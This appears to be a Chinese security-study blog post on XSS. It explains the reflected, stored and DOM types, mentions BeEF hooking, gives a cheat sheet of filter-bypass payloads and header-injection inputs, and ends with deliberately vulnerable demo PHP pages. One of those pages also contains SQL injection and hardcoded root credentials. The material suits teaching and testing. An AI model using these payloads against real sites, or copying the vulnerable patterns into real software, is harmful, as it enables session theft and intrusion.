title: XSS攻击
author: John Doe
date: 2023-05-05 14:16:35
tags:
---
# XSS的攻击方式
{% blockquote CSDN https://blog.csdn.net/m0_46201544/article/details/127578322 Go to CSDN %}
XSS-lab通关
{% endblockquote %}
## 反射型XSS：
<li>(非持久化)攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。一般是后端代码进行处理。
<li>反射型XSS的被攻击对象一般是攻击者去寻找的，就比如说：一个攻击者想盗取A的账号，那么攻击者就可以将一个含有反射型XSS的特制URL链接发送给A，然后用花言巧语诱骗A点击链接。当A不小心点进去时，就会立即受到XSS攻击。这种攻击方式需要一点骗术，所以这种攻击范围不是特别的广，并且提交漏洞时要么平台不认，要么会被认定为低危漏洞。
<li>反射型则需要服务器参与。
 
![upload successful](/images/pasted-572.png)

![upload successful](/images/pasted-566.png)
表示在前端，使用beef-xss钓鱼攻击，前端提交攻击字段

![upload successful](/images/pasted-568.png)
beef-xss成功上线

![upload successful](/images/pasted-567.png)

## 存储型XSS
<li>存储型XSS又称持久型XSS，攻击脚本将被永久地存放在目标服务器的数据库或文件中，具有很高的隐蔽性。
存储型XSS可以采用广撒网的方式，就是攻击者将存储型XSS代码写进一些有XSS漏洞的网站上，只要有用户访问这个链接就会自动中招。所以我们可以看出，存储型XSS的危害性更大，范围更广，可以不需要寻找被攻击对象，只要存储型XSS在服务器上就能实施攻击。所以提交的存储型XSS评级一般为中危漏洞。
  
![upload successful](/images/pasted-569.png)
将制作好的攻击载荷提交，提交后访问show页面

![upload successful](/images/pasted-570.png)
beef-xss成功上线，查看mysql中数据，发现攻击载荷成功写入mysql

![upload successful](/images/pasted-571.png)

## DOM型XSS
<li>DOM有一个比较大的特征，这一整个弹窗的过程，其实都是在前端完成的，这一整个过程是没有跟我们的后台交互的，数据并没有通过get、post的方式提交到后台，所以说，DOM是一个前端的操作接口
<li>这一串输入既不会在url里面，也不会在后台存储下来，刷新一下，这个东西就没了，其实在我们场景下，这个例子确实是比较鸡肋的，但是不能不说，它是个问题，只能说这个地方是出现了比较低危的dom型xss。它的原因，其实是前端的输入被dom给获取到了，也就是对dom进行了操作，然后通过dom又在前端输出了，它是不经过后台输出的
<li>DOM型与服务器没有太大的关系，不需要和服务器交互，攻击纯粹发生在客户端。
![upload successful](/images/pasted-573.png)
  
<code>"onclick='alert(1)'</code>

![upload successful](/images/pasted-574.png)

![upload successful](/images/pasted-575.png)


# Payload及绕过
{% codeblock lang:PHP %}
<sCr<scrscRiptipt>ipt>OonN\&apos;\"<>
'> value='' onmouseover='alert(/xss)'>
遇见alert直接清楚
"><img src=x onerror=aalertlert(1)>
遇见alert直接退出
"><img src=x onerror=prompt(1)》('》'需要替换成'>')
一些危险字符被删掉：script、alert、on、img
"><imimgg src=x oonnerror=alalertert(1)>

# ' onclick="alert(111)">


1.普通的
<script>alert(document.cookie)</script>
<script>alert(1)</script>
<ScRipt>alert(1)</ScRipt>
1"><ScRipt>alert(1)</ScRipt>

2.绕过htmlspecialchars方法，先闭合输入，再使用事件来绕过
onclick='alert(1)'
' onclick ='javascript:alert(1)'//    ##点击鼠标触发
" onclick ='javascript:alert(1)'//
onmouseover='alert(1)'   ##移动鼠标触发

3.<> script onclick被过滤，用a标签绕过
"></input><a href='javascript:alert(1)'>img</a>//

4.重写绕过
1"><ScscriptRipt>alert(1)</ScscriptRipt>

5.Unicode编码绕过
javascript:alert(1)

6.使用type=text来显示被隐藏的标签，再用事件
&t_sort=" type='text' onclick='javascript:alert(1)'>//

7.referer UserAgent Cookie等地方也可以进行xss测试
referer:" type='text' onclick='javascript:alert(1)'>//

8.图片

<img src=xxxx οnerrοr=alert(1)>'

9.用这些字符来测试哪些被过滤了
“ ‘ <> script onerror  onclick

10.空格用回车编码代替
<a%0D%0Aοnclick='alert(1)'>

11.ASCII编码绕过
keyword=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;

12.利用参数传递数据
" onclick='alert(1)' type="text
Referer:" onclick='alert(1)' type="text
USER_AGENT:" onclick='alert(1)' type="text
cookies:user=" onclick='alert(1)' type="text

{% endcodeblock %}

{% blockquote CSDN https://blog.csdn.net/weixin_41489908/article/details/103798622 Go to CSDN %}
XSS常见payload
{% endblockquote %}

<a href='https://www.qqxiuzi.cn/bianma/zifushiti.php'>HTML字符实体转换器</a>

# 源码分析
{% codeblock lang:PHP %}
<input name=keyword  value=""><script>alert(1)</script>
<input name=keyword  value=''onclick='alert(1)'>
<input name=keyword  value="" onclick="alert(1)">
<input name=keyword  value=""><a href="javascript:alert(1)">
{% endcodeblock %}
  
# 自己写的简单代码，存在XSS

## 反射型XSS

{% codeblock lang:1.html %}
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title>反射型XSS</title>
</head>
<body>
    <form action="action.php" method="post">  <!-- <form>表示文档的服务器区域，此区域中包含一个Web站点的信息控件，用于向Web服务器区域提交 -->
        <input type="text" name="name" />
        <input type="submit" value="提交">
    </form>
</body>
</html>
{% endcodeblock %}

{% codeblock lang:action.php %}
<?php
    $name=$_POST["name"]; 
	echo $name;
?>
{% endcodeblock %}

## 存储型XSS

{% codeblock lang:2.html %}
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title>存储型XSS</title>
</head>
<body>
    <form action="action2.php" method="post">
        输入你的ID：  <input type="text" name="id" /> <br/>
        输入你的Name：<input type="text" name="name" /> <br/>
        <input type="submit" value="提交">
    </form>
</body>
</html>
{% endcodeblock %}

{% codeblock lang:action2.php %}
<?php
	$id=$_POST["id"];
	$name=$_POST["name"];
	mysql_connect("localhost","root","root",3306);
	mysql_select_db("test");
	
	$sql="insert into test_0 value ($id,'$name')";
	$result=mysql_query($sql);
?>
{% endcodeblock %}

{% codeblock lang:show2.php %}
<?php
	mysql_connect("localhost","root","root");
	mysql_select_db("test");
	$sql="select * from test_0 where id=1";
	$result=mysql_query($sql);
	while($row=mysql_fetch_array($result)){
		echo $row['name'];
	}
?>
{% endcodeblock %}

## DOM型XSS
{% codeblock lang:3.html %}
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title>DOM型XSS</title>
</head>
<body>
    <form action="action3.php" method="post">
        <input type="text" name="name" />
        <input type="submit" value="提交">
    </form>
</body>
</html>
{% endcodeblock %}
{% codeblock lang:action3.php %}
<?php
  $name=$_POST["name"];
?>
<input id="text" type="text" value="<?php echo $name; ?>"/>
<div id="print"></div>
<script type="text/javascript">
  var text=document.getElementById("text");
  var print=document.getElementById("print");
  print.innerHTML=text.value;  // 获取 text的值，并且输出在print内。这里是导致 xss 的主要原因。
</script>
{% endcodeblock %}